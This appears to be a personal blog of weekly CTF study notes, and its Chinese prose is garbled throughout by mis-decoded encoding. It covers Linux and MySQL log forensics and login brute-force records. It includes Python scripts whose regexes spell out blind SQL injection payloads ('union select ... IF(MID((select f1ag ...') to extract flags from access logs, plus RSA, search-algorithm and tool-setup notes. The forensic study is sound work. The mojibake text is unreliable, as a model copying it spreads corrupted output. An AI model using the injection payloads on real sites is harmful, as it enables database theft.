<li><code>egrep -ri &#39;error|warn&#39; /var/log/messages</code></li>
</ul>
</li>
<li><code>maillog</code>é‚®ä»¶ç›¸å…³æ—¥å¿—<ul>
<li><code>cat mallog</code></li>
</ul>
</li>
<li><code>secure</code>æ—¥å¿—<ul>
<li>è®°è½½ç³»ç»Ÿå®‰å…¨ä¿¡æ¯ã€‚æœ€å…¸å‹çš„å°±æ˜¯ç™»å½•æƒ…å†µã€‚</li>
<li>ç™»å½•æˆåŠŸä¸å¦ï¼›è´¦å·çš„å¢åˆ æ”¹æƒ…å†µã€‚</li>
</ul>
</li>
<li><code>boot.log</code><ul>
<li>è¯¥æ—¥å¿—ä¸»è¦è®°è½½ç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹</li>
</ul>
</li>
<li><code>Boot.log</code><ul>
<li>è¯¥æ—¥å¿—ä¸»è¦è®°è½½ç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹</li>
</ul>
</li>
<li><code>last.log</code><ul>
<li>æœ€è¿‘ä¸€æ¬¡æˆåŠŸç™»é™†è®°å½•</li>
</ul>
</li>
<li>â€¦â€¦</li>
</ul>
<h2 id="IISæ—¥å¿—åˆ†æ-Mysqlæ—¥å¿—åˆ†æ"><a href="#IISæ—¥å¿—åˆ†æ-Mysqlæ—¥å¿—åˆ†æ" class="headerlink" title="IISæ—¥å¿—åˆ†æ+Mysqlæ—¥å¿—åˆ†æ"></a>IISæ—¥å¿—åˆ†æ+Mysqlæ—¥å¿—åˆ†æ</h2><blockquote>
<p>è·Ÿwebæ•´ä¸ªæ”»å‡»æ€è·¯æ¯”è¾ƒç±»ä¼¼ã€‚</p>
<p><a href="https://www.secpulse.com/archives/107874.html">MySQLæ—¥å¿—å®‰å…¨åˆ†ææŠ€å·§ - SecPulse.COM | å®‰å…¨è„‰æ</a></p>
</blockquote>
<p>è®¿é—® <code>/test.php?id=1</code>ï¼Œæ­¤æ—¶æˆ‘ä»¬å¾—åˆ°è¿™æ ·çš„æ—¥å¿—ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">190604 14:46:14       14 Connect    root@localhost on</span><br><span class="line">                      14 Init DB    test   </span><br><span class="line">                      14 Query    SELECT * FROM admin WHERE id = 1     </span><br><span class="line">                      14 Quit</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€åˆ—ï¼šTimeï¼Œæ—¶é—´åˆ—ï¼Œå‰é¢ä¸€ä¸ªæ˜¯æ—¥æœŸ,åé¢ä¸€ä¸ªæ˜¯å°æ—¶å’Œåˆ†é’Ÿï¼Œæœ‰ä¸€äº›ä¸æ˜¾ç¤ºçš„åŸå› æ˜¯å› ä¸ºè¿™äº›sqlè¯­å¥å‡ ä¹æ˜¯åŒæ—¶æ‰§è¡Œçš„,æ‰€ä»¥å°±ä¸å¦å¤–è®°å½•æ—¶é—´äº†ã€‚<br>ç¬¬äºŒåˆ—ï¼šIdï¼Œå°±æ˜¯show processlistå‡ºæ¥çš„ç¬¬ä¸€åˆ—çš„çº¿ç¨‹ID,å¯¹äºé•¿è¿æ¥å’Œä¸€äº›æ¯”è¾ƒè€—æ—¶çš„sqlè¯­å¥,ä½ å¯ä»¥ç²¾ç¡®æ‰¾å‡ºç©¶ç«Ÿæ˜¯é‚£ä¸€æ¡é‚£ä¸€ä¸ªçº¿ç¨‹åœ¨è¿è¡Œã€‚<br>ç¬¬ä¸‰åˆ—ï¼šCommandï¼Œæ“ä½œç±»å‹ï¼Œæ¯”å¦‚Connectå°±æ˜¯è¿æ¥æ•°æ®åº“ï¼ŒQueryå°±æ˜¯æŸ¥è¯¢æ•°æ®åº“(å¢åˆ æŸ¥æ”¹éƒ½æ˜¾ç¤ºä¸ºæŸ¥è¯¢)ï¼Œå¯ä»¥ç‰¹å®šè¿‡è™‘ä¸€äº›æ“ä½œã€‚<br>ç¬¬å››åˆ—ï¼šArgumentï¼Œè¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚ Connect  root@localhost on æ„æ€å°±æ˜¯è¿æ¥æ•°æ®åº“ï¼Œå¦‚æ­¤ç±»æ¨,æ¥ä¸‹é¢çš„è¿ä¸Šæ•°æ®åº“ä¹‹å,åšäº†ä»€ä¹ˆæŸ¥è¯¢çš„æ“ä½œã€‚</p>
<p>MySQLä¸­çš„<code>log</code>è®°å½•æ˜¯è¿™æ ·å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Time                 Id        Command         Argument</span><br><span class="line">190601 22:03:20     98 Connect  root@192.168.204.1 on</span><br><span class="line">        98 Connect  Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        103 Connect  mysql@192.168.204.1 on       </span><br><span class="line">        103 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        104 Connect  mysql@192.168.204.1 on       </span><br><span class="line">        104 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        100 Connect  root@192.168.204.1 on       </span><br><span class="line">        101 Connect  root@192.168.204.1 on       </span><br><span class="line">        101 Connect  Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)       </span><br><span class="line">        99 Connect  root@192.168.204.1 on        </span><br><span class="line">        99 Connect  Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        105 Connect  mysql@192.168.204.1 on       </span><br><span class="line">        105 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        100 Query  set autocommit=0      </span><br><span class="line">        102 Connect  mysql@192.168.204.1 on       </span><br><span class="line">        102 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        100 Quit</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨çˆ†ç ´å·¥å…·ï¼Œä¸€ä¸ªå£ä»¤<strong>çŒœè§£æˆåŠŸ</strong>çš„è®°å½•æ˜¯è¿™æ ·å­çš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">190601 22:03:20     100 Connectroot@192.168.204.1 on</span><br><span class="line">   100 Queryset autocommit=0   </span><br><span class="line">   100 Quit</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–æ–¹å¼ç™»å½•æˆåŠŸçš„è®°å½•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Navicat for MySQLç™»å½•ï¼š</span><br><span class="line">190601 22:14:07  106 Connectroot@192.168.204.1 on         </span><br><span class="line">         106 QuerySET NAMES utf8</span><br><span class="line">         106 QuerySHOW VARIABLES LIKE &#x27;lower_case_%&#x27;         </span><br><span class="line">         106 QuerySHOW VARIABLES LIKE &#x27;profiling&#x27;         </span><br><span class="line">         106 QuerySHOW DATABASES</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å‘½ä»¤è¡Œç™»å½•</span><br><span class="line">190601 22:17:25  111 Connectroot@localhost on</span><br><span class="line">         111 Queryselect @@version_comment limit 1</span><br><span class="line">         190601 22:17:56  111 Quit</span><br></pre></td></tr></table></figure>

<p><strong>ç™»å½•å¤±è´¥</strong>çš„è®°å½•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">102 Connect  mysql@192.168.204.1 on </span><br><span class="line">102 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br></pre></td></tr></table></figure>



<h1 id="230321"><a href="#230321" class="headerlink" title="230321"></a>230321</h1><h2 id="æ—¥å¿—åˆ†æé¢˜ç›®æµç¨‹"><a href="#æ—¥å¿—åˆ†æé¢˜ç›®æµç¨‹" class="headerlink" title="æ—¥å¿—åˆ†æé¢˜ç›®æµç¨‹"></a>æ—¥å¿—åˆ†æé¢˜ç›®æµç¨‹</h2><h3 id="Windowsæ—¥å¿—åˆ†æ"><a href="#Windowsæ—¥å¿—åˆ†æ" class="headerlink" title="Windowsæ—¥å¿—åˆ†æ"></a>Windowsæ—¥å¿—åˆ†æ</h3><ul>
<li>å…³é”®å­—<code>3389</code> -&gt; è¿œç¨‹è¿æ¥ -&gt; ç™»å½•ç±»å‹ <code>10</code></li>
<li>å…ˆç­›é€‰<code>529</code>å¤±è´¥çš„</li>
<li>å†ç­›é€‰<code>528</code>æˆåŠŸçš„</li>
<li>ä¸¤è€…ç»“åˆæŸ¥çœ‹ï¼ŒæŸ¥æ‰¾åˆ°ç™»å½•IP<code>192.168.152.1</code>ä»¥åŠåˆæ¬¡ç™»å½•æ—¶é—´ä¸º<code>2015/10/21 16:11:34</code></li>
</ul>
<h3 id="Linuxæ—¥å¿—åˆ†æ"><a href="#Linuxæ—¥å¿—åˆ†æ" class="headerlink" title="Linuxæ—¥å¿—åˆ†æ"></a>Linuxæ—¥å¿—åˆ†æ</h3><ul>
<li>åˆ©ç”¨<code>notepad++</code>ï¼Œè¿›è¡Œ<code>æ ‡è®°</code>ä»¥åŠ<code>è¿‡æ»¤</code><ul>
<li>æ ‡è®°</li>
<li>åŒæ—¶æ ‡è®°æ‰€åœ¨è¡Œ</li>
<li><code>æœç´¢</code> -&gt; <code>åˆ é™¤æœªæ ‡è®°è¡Œ</code></li>
</ul>
</li>
<li>å…³é”®å­—<code>failed</code> ã€<code>accepted</code>è¿›è¡Œç»¼åˆåˆ†æ</li>
<li><code>192.168.4.23</code></li>
<li><code>Nov 19 17:28:47</code></li>
</ul>
<h1 id="230323"><a href="#230323" class="headerlink" title="230323"></a>230323</h1><h2 id="å¤ç°-æ—¥å¿—åˆ†æ"><a href="#å¤ç°-æ—¥å¿—åˆ†æ" class="headerlink" title="å¤ç°-æ—¥å¿—åˆ†æ"></a>å¤ç°-æ—¥å¿—åˆ†æ</h2><blockquote>
<p>å‡ç”¨<code>notepad++</code></p>
</blockquote>
<h3 id="IISæ—¥å¿—åˆ†æ"><a href="#IISæ—¥å¿—åˆ†æ" class="headerlink" title="IISæ—¥å¿—åˆ†æ"></a>IISæ—¥å¿—åˆ†æ</h3><ul>
<li>å¤§æ¦‚çœ‹è¿‡ä¸€éæ‰€ç»™æ–‡ä»¶</li>
<li>ä¸­é—´å­˜åœ¨<code>admin</code>ï¼Œå…ˆæŠŠç›¸å…³æ¡ç›®è¿‡æ»¤å‡ºæ¥</li>
<li>å†çœ‹ä¸‹å¤§æ¦‚ï¼Œå‘ç°å­˜åœ¨å¤§é‡<code>404</code>ï¼Œåˆ©ç”¨<code>200</code>è¿‡æ»¤å‡ºæ¥</li>
<li>å¯ä»¥ç›´æ¥åˆ©ç”¨æ­£åˆ™åŒ¹é…<code>admin.*200</code>è¿‡æ»¤</li>
</ul>
<h3 id="sqlæ—¥å¿—åˆ†æ"><a href="#sqlæ—¥å¿—åˆ†æ" class="headerlink" title="sqlæ—¥å¿—åˆ†æ"></a>sqlæ—¥å¿—åˆ†æ</h3><blockquote>
<p>å¸ƒå°”ç›²æ³¨</p>
</blockquote>
<ul>
<li>å…ˆè¿‡æ»¤å‡º<code>flag_is_here</code>å…³é”®å­—</li>
<li>å†è¿‡æ»¤å‡ºå“åº”ç ä¸º<code>200</code>çš„æ•°æ®</li>
<li>å¯ä»¥çœ‹å‡ºæ˜¯<code>å¸ƒå°”ç›²æ³¨</code></li>
<li>å¯ä»¥ç›´æ¥çœ‹å‡ºå…·ä½“çš„æ•°å€¼<code> flag_list = [102, 108, 97, 103, 123, 115, 113, 108, 109, 48, 112, 95, 53, 49, 95, 112, 48, 119, 101, 114, 102, 117, 108, 125]</code>ï¼Œå†™è„šæœ¬ç¨å¾®è½¬æ¢å¯å¾—<code>flag&#123;sqlm0p_51_p0werful&#125;</code></li>
<li>å†™è„šæœ¬æå–è½¬æ¢</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;access.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">lines = f.readlines()</span><br><span class="line">datas = []</span><br><span class="line"></span><br><span class="line">flag_dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    matchObj = re.search(<span class="string">r&#x27;LIMIT 0,1\),(.*?),1\)\)&gt;(.*?) AND&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> matchObj:</span><br><span class="line">        flag = <span class="built_in">int</span>(matchObj.group(<span class="number">1</span>))</span><br><span class="line">        value = <span class="built_in">int</span>(matchObj.group(<span class="number">2</span>)) + <span class="number">1</span></span><br><span class="line">        flag_dic[flag] = value</span><br><span class="line">    <span class="built_in">print</span>(flag_dic)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> flag_dic.values():</span><br><span class="line">    flag += <span class="built_in">chr</span>(value)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="sqlæ—¶é—´ç›²æ³¨"><a href="#sqlæ—¶é—´ç›²æ³¨" class="headerlink" title="sqlæ—¶é—´ç›²æ³¨"></a>sqlæ—¶é—´ç›²æ³¨</h3><ul>
<li>ç”¨å·¥å…·è¿›è¡Œ<code>url-decode</code></li>
<li>åˆ©ç”¨<code>sleep(3)</code>ç»§ç»­è¿‡æ»¤ï¼Œæœ€åå¾—åˆ°ç¬¦åˆæ¡ä»¶çš„æ•°æ®</li>
<li>è§‚å¯Ÿå‘ç°ï¼Œé‡Œé¢æ—¶é—´ç›¸åŒçš„å¯èƒ½ä¸º<code>flag</code></li>
<li>å†™è„šæœ¬è¿›è¡Œæå–</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">lines = f.readlines()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># print(lines[0])</span></span><br><span class="line"><span class="comment"># æ­£åˆ™åŒ¹é…å¾—åˆ°ç›¸å…³æ•°æ®</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f1 = re.search(<span class="string">r&#x27;(\d+:\d+:\d+) -0500] \&quot;GET /web/admin/sql.php\?id=-1 union select 1,IF\(MID\(\(select f1ag from f1ag limit 0,1\),\d+,1\)\=binary\(\&#x27;(.*?)\&#x27;\)&#x27;</span>, lines[i-<span class="number">1</span>])</span><br><span class="line">        f2 = re.search(<span class="string">r&#x27;(\d+:\d+:\d+) -0500] \&quot;GET /web/admin/sql.php\?id=-1 union select 1,IF\(MID\(\(select f1ag from f1ag limit 0,1\),\d+,1\)\=binary\(\&#x27;(.*?)\&#x27;\)&#x27;</span>, lines[i])</span><br><span class="line">        <span class="comment"># print(f1)</span></span><br><span class="line">        <span class="keyword">if</span> f1[<span class="number">1</span>] == f2[<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(f1[<span class="number">1</span>])</span><br><span class="line">            flag += f1[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h2><p>å­—å…¸è®¾ç½®é”®å€¼ä¹‹åå¯ä»¥ä¸åœæ›¿æ¢<code>value</code></p>
<p>é€‚åˆç›´æ¥é”®å€¼å›ºå®šä½†<code>value</code>ä¸å›ºå®šçš„ç›²æ³¨ã€‚</p>
<h1 id="230327"><a href="#230327" class="headerlink" title="230327"></a>230327</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x=pow(m,p,n)</span><br><span class="line">y=pow(m,q,n)</span><br><span class="line">x=m^p%n ä¸€</span><br><span class="line">y=m^q%n äºŒ</span><br><span class="line"></span><br><span class="line">x=m^p%n</span><br><span class="line">ä¸¤è¾¹åŒæ—¶å¹³æ–¹ä¸ªq</span><br><span class="line">x^q=(m^p)^q%n</span><br><span class="line">x^q=m^n%n</span><br><span class="line">x^q=(m^q)^p%n</span><br><span class="line">x^q=(m^q%n)^p%n</span><br><span class="line">å°†å¼ äºŒä»£å…¥</span><br><span class="line">x^q=y^p%n</span><br><span class="line">ä¸¤è¾¹åŒæ—¶å¹³æ–¹ä¸ªp</span><br><span class="line">(x^q)^p=(y^p)^p%n</span><br><span class="line">x^(q*p)=(y^p)^p%n</span><br><span class="line">x^n=(y^p)^p%n</span><br><span class="line"></span><br><span class="line">x^n=(y^p)^p+kn</span><br><span class="line">x^n=(y^p)^p+kpq</span><br><span class="line">#ä¸¤è¾¹åŒæ—¶æ¨¡p</span><br><span class="line">x^n%p=(y^p)^p%p+kpq%p</span><br><span class="line">x^n%p=(y^p)^p%p</span><br><span class="line">#æ ¹æ®è´¹é©¬å°å®šç†</span><br><span class="line">a^p-1%p=1 a^p%p=a</span><br><span class="line">x^n%p=(y^p)%p</span><br><span class="line">x^n%p=y%p</span><br><span class="line">x^n=y+kp</span><br><span class="line">x^n-y=kp</span><br><span class="line">kp=x^n-y</span><br><span class="line">åˆ©ç”¨å…¬çº¦æ•°æ±‚p</span><br><span class="line">p=gcd(x^n-y,n)</span><br></pre></td></tr></table></figure>

<h1 id="230404"><a href="#230404" class="headerlink" title="230404"></a>230404</h1><h2 id="é»„é‡‘åˆ†å‰²æŸ¥æ‰¾æ³•"><a href="#é»„é‡‘åˆ†å‰²æŸ¥æ‰¾æ³•" class="headerlink" title="é»„é‡‘åˆ†å‰²æŸ¥æ‰¾æ³•"></a>é»„é‡‘åˆ†å‰²æŸ¥æ‰¾æ³•</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fib = <span class="keyword">lambda</span> n: n <span class="keyword">if</span> n &lt; <span class="number">2</span> <span class="keyword">else</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fib_search</span>(<span class="params">arr, x</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="built_in">len</span>(arr) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> fib(key) &lt; <span class="built_in">len</span>(arr):</span><br><span class="line">        key += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">        mid = <span class="built_in">min</span>(left + fib(key - <span class="number">1</span>), <span class="built_in">len</span>(arr) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> x &lt; arr[mid]:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">            key -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> x &gt; arr[mid]:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">            key -= <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fib_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>]</span><br><span class="line">flag_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_list:</span><br><span class="line">    flag += <span class="built_in">str</span>(fib_search(fib_list, x=i))</span><br><span class="line"><span class="comment"># assert len(flag) == 32</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># arrä¸ºä½¿ç”¨çš„æ–æ³¢é‚£å¥‘æ•°åˆ—</span></span><br><span class="line"><span class="comment"># xä¸ºä½¿ç”¨çš„æŸ¥è¯¢å¯†é’¥</span></span><br></pre></td></tr></table></figure>

<h1 id="230406"><a href="#230406" class="headerlink" title="230406"></a>230406</h1><h2 id="å“ˆå¸ŒæŸ¥æ‰¾æ³•"><a href="#å“ˆå¸ŒæŸ¥æ‰¾æ³•" class="headerlink" title="å“ˆå¸ŒæŸ¥æ‰¾æ³•"></a>å“ˆå¸ŒæŸ¥æ‰¾æ³•</h2><p>$$<br>H &#x3D; f(key)<br>$$</p>
<p><em>å“ˆå¸Œè¡¨å­˜å‚¨ä½ç½®ä¸»è¦ç”±keyæ¥ç¡®å®š</em></p>
<p>å…·ä½“çš„ä»‹ç»ä¸»è¦çœ‹OneNote-2023-04-04</p>
<ol>
<li>æ„å»ºå“ˆå¸Œè¡¨<ol>
<li>ç›´æ¥å®šå€æ³•</li>
<li>æ•°å­—åˆ†ææ³•</li>
<li>å¹³æ–¹å–ä¸­æ³•</li>
<li>æŠ˜å æ³•<ol>
<li>ç§»ä½æŠ˜å </li>
<li>é—´ç•ŒæŠ˜å </li>
</ol>
</li>
<li>é™¤ç•™ä½™æ•°æ³•</li>
<li>éšæœºæ•°æ³•</li>
</ol>
</li>
<li>å¤„ç†å†²çª<ol>
<li>å¼€æ”¾å®šå€æ³•<ol>
<li>çº¿æ€§æ¢æµ‹æ³•</li>
<li>äºŒæ¬¡æ¢æµ‹æ³•</li>
<li>ä¼ªéšæœºæ•°æ¢æµ‹æ³•</li>
</ol>
</li>
<li>å†å“ˆå¸Œæ³•</li>
<li>é“¾åœ°å€æ³•</li>
<li>å»ºç«‹å…¬å…±æº¢å‡ºåŒº</li>
</ol>
</li>
</ol>
<h2 id="åˆ†å—æŸ¥æ‰¾æ³•"><a href="#åˆ†å—æŸ¥æ‰¾æ³•" class="headerlink" title="åˆ†å—æŸ¥æ‰¾æ³•"></a>åˆ†å—æŸ¥æ‰¾æ³•</h2><blockquote>
<p>ç´¢å¼•æŸ¥æ‰¾æ³•</p>
</blockquote>
<p>ç±»ä¼¼æ•°æ®åº“ä¸­çš„ç´¢å¼•æŸ¥æ‰¾ï¼Œç®—æ³•æ ¸å¿ƒä¾æ—§æ˜¯çº¿æ€§æŸ¥æ‰¾ã€‚</p>
<ol>
<li>è¿›è¡Œåˆ†å—<ol>
<li>åˆ†å—æ•°ç›®è‡ªå®š</li>
<li>å—å†…æ— åºï¼Œå—å¤–æœ‰åºï¼Œæ•´ä½“å‡åºæˆ–è€…é™åº</li>
<li>å‰ä¸€å—çš„maxï¼Œå¿…é¡»å°äºåä¸€å—çš„min</li>
</ol>
</li>
<li>å»ºç«‹ç´¢å¼•è¡¨</li>
</ol>
<h2 id="ä¸´æ—¶æ¢æº"><a href="#ä¸´æ—¶æ¢æº" class="headerlink" title="ä¸´æ—¶æ¢æº"></a>ä¸´æ—¶æ¢æº</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://pypi.tuna.tsinghua.edu.cn/simple #æ¸…å</span><br><span class="line">https://pypi.mirrors.ustc.edu.cn/simple/ #ä¸­å›½ç§‘æŠ€å¤§å­¦</span><br><span class="line">https://mirrors.aliyun.com/pypi/simple/ #é˜¿é‡Œ</span><br><span class="line">http://pypi.douban.com/simple/ #è±†ç“£</span><br></pre></td></tr></table></figure>

<h1 id="230407"><a href="#230407" class="headerlink" title="230407"></a>230407</h1><h2 id="å­˜åœ¨zsh-historyæŠ¥é”™"><a href="#å­˜åœ¨zsh-historyæŠ¥é”™" class="headerlink" title="å­˜åœ¨zsh_historyæŠ¥é”™"></a>å­˜åœ¨zsh_historyæŠ¥é”™</h2><blockquote>
<p><code>zsh: corrupt history file ~/.zsh_history</code></p>
<p>å­˜åœ¨ä¸Šè¿°æŠ¥é”™ï¼ŒåŸºæœ¬å› ä¸ºå…³æœºçš„æ—¶å€™å•¥éƒ½æ²¡é€€ï¼Œå¯¼è‡´ä¸­æ–­ä¿å­˜ï¼Œå†å¼€å¯æ—¶å°±å‡ºç°å¦‚ä¸ŠæŠ¥é”™ä¿¡æ¯ã€‚</p>
</blockquote>
<p>ä¸Šç½‘æŸ¥æ‰¾æŠ¥é”™ä¿¡æ¯æœ‰å„ç§æ–¹æ³•ï¼Œä½†å½“å‰é€‰æ‹©äº†æœ€ç®€å•ç›´æ¥çš„æ–¹æ³•ï¼Œå°±ç›´æ¥æš´åŠ›åˆ é™¤åŸå§‹æ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /home/kali/.zsh_history</span><br></pre></td></tr></table></figure>

<h1 id="230331"><a href="#230331" class="headerlink" title="230331"></a>230331</h1><p>å¯†é’¥çˆ†ç ´ &lt;- ä¼ªåŠ å¯† &lt;- æ©ç çˆ†ç ´</p>
<h2 id="æ©ç çˆ†ç ´"><a href="#æ©ç çˆ†ç ´" class="headerlink" title="æ©ç çˆ†ç ´"></a>æ©ç çˆ†ç ´</h2><p>å·²çŸ¥å¯†ç æ˜¯è¿™ä¸²å­—ç¬¦ï¼Œä½ çŸ¥é“å¦‚ä½•çˆ†ç ´å‡ºæ¥å˜›ï¼Ÿ</p>
<p>æç¤ºï¼šéƒ½æ˜¯å°å†™å­—æ¯ã€‚</p>
<p><strong>do_u_like_xxx</strong></p>
<h1 id="230411"><a href="#230411" class="headerlink" title="230411"></a>230411</h1><h2 id="vscodeè¿è¡Œsagemath"><a href="#vscodeè¿è¡Œsagemath" class="headerlink" title="vscodeè¿è¡Œsagemath"></a>vscodeè¿è¡Œsagemath</h2><blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/297736314">vscode+jupyternotebook+sagemathé…ç½® - çŸ¥ä¹ (zhihu.com)</a></p>
</blockquote>
<p>ä¸»è¦åŸç†å°±æ˜¯ç›´æ¥åˆ©ç”¨sagemathè‡ªå¸¦çš„notebookï¼ˆjupyterï¼‰çš„serverè¿è¡Œä»£ç ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230411193506218.png" class="" title="image-20230411193506218">

<p>çº¢æ¡†å†…ç›´æ¥æ‰“å¼€è¿è¡Œã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230411193546560.png" class="" title="image-20230411193546560">



<p>è¿è¡Œå¾—åˆ°<code>æœ¬åœ°åœ°å€ + token</code>çš„å½¢å¼ï¼Œæˆ‘ä»¬ä¸»è¦åˆ©ç”¨è¿™æ ·ä¸€ä¸²å­—ç¬¦ä¸²è¿›è¡Œè°ƒç”¨ã€‚</p>
<p>æ‰“å¼€<code>vsCode</code>ï¼Œå‰ç½®å‡†å¤‡æ¯”å¦‚vscodeé…ç½®pythonå•¥çš„ï¼Œä¿®æ”¹ä»£ç é¢œè‰²å•¥çš„å°±ä¸æäº†ã€‚</p>
<p>ç›´æ¥åˆ°åˆ‡æ¢<strong>configuration</strong>ä¸€æ­¥ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230411193821262.png" class="" title="image-20230411193821262">

<p>SageMath 9.3ä¸ºæˆ‘ä»¬è°ƒç”¨æœåŠ¡å™¨ä¹‹åå‡ºç°çš„é…ç½®ã€‚</p>
<p>é€‰æ‹©<code>Select</code>ï¼Œé€‰æ‹©<code>Existing</code>é€‰é¡¹ã€‚æŠŠä¸Šé¢ä¸€ä¸²å¸¦<code>token</code>çš„å­—ç¬¦ä¸²ç›´æ¥è¾“å…¥ï¼Œç„¶åç­‰å¾…è¿æ¥ï¼Œå³å¯å®Œæˆé…ç½®ï¼Œé‡å¯ä¸€ä¸‹ï¼Œå³å¯åœ¨<code>vscode</code>ä¸­ä½¿ç”¨<code>sagemath</code>ã€‚</p>
<p>æ–°å»ºæ–‡ä»¶åç¼€åä¸º<code>.ipynb</code>ï¼Œç„¶åå°±å¯ä»¥æŒ‰ç…§åƒ<code>sagemath-notebook</code>ä¸€æ ·è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨pythonçš„ä»£ç é¢œè‰²ï¼Œèƒ½å¤Ÿç›´æ¥åƒ<code>pycharm</code>ä¸€æ ·è¯†åˆ«ä¸€äº›å‡½æ•°ï¼Œä½†æœ‰æ—¶å€™åˆä¸ä¼šæ˜¾ç¤ºã€‚</p>
<p>æ€»ä½“æ¥è¯´ï¼Œæ¯”æœ€åŸå§‹çš„shellä»¥åŠnotebookï¼Œè¦æ›´ä¸ºæ–¹ä¾¿ä¸€ç‚¹ã€‚</p>
